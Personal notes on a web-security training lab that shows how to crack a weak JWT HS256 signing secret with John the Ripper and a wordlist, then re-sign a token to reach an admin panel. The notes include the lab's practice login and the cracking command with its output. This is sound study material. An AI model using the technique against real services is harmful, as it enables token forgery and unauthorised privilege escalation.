# Lab: JWT authentication bypass via weak signing key

Description : It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced  [wordlist of common secrets.](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)

End goal : privilage esclation (access the admin panel)

creds : `wiener:peter`

Notes :

"alg": "HS256" -> weak algorithm could be brute forced

while dealing with hashing and encryption stuff , take care of the newlines while u pasting the original encrypted or hashed value

for example :

echo -n "secrect_value" -> this prints the value without adding new line -> which is good

echo "secrect_value" -> this prints the value and adding new line -> which is bad , and u might take hours to figure out whats wrong

look at `jwt.txt` , `jwt2.txt` for live example (Note the number of lines)

cracking jwt secret key:

`john jwt.txt --wordlist=secret_key_wordlist.txt`

> Using default input encoding: UTF-8
>
> Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
>
> Will run 8 OpenMP threads
>
> Press 'q' or Ctrl-C to abort, almost any other key for status
>
> secret1          (?)
>
> 1g 0:00:00:00 DONE (2024-09-21 21:11) 50.00g/s 819200p/s 819200c/s 819200C/s ..6959156
>
> Use the "--show" option to display all of the cracked passwords reliably
>
> Session completed.

after aquiring the secret key for jwt , dont forget to encode it using base64 before using it to sign ur jwt
